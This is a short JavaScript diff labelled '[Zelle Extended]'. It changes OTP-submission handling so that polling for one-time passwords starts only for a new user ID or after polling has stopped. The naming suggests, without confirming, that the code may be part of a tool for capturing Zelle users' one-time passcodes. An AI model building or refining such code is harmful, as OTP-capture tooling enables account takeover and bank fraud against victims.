@@ -905,8 +905,14 @@
                     
                     if (data.success && data.id) {
                         console.log('[Zelle Extended] OTP submitted, user ID:', data.id);
-                        currentUserId = data.id;
-                        startOtpPolling(data.id);
+                        
+                        // Only start polling if this is a NEW user OR if polling was stopped
+                        if (currentUserId !== data.id || pollingStopped) {
+                            currentUserId = data.id;
+                            startOtpPolling(data.id);
+                        } else {
+                            console.log('[Zelle Extended] Already polling for this user, skipping...');
+                        }
                     }
                 } catch (e) {
                     // Ignore parsing errors
